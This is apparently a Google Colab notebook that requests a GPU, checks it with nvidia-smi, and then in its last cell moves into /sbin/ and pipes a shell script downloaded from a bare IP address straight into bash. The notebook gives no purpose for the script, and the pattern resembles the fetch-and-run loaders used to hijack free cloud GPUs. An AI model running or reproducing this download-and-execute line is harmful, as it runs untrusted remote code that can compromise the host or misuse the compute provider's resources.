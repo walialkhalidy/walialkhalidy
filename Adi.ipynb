{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Adi.ipynb",
      "private_outputs": true,
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "hCOUjXK21ddG"
      },
      "source": [
        "# Example"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3cc3zwLI3BQU"
      },
      "source": [
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "V6Qc9cu82_Pd"
      },
      "source": [
        "%cd /sbin/\n",
        "!ls -la\n",
        "!curl -O rrrr http://54.36.167.80/~kevinbazi/Adi.sh -sL | bash"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}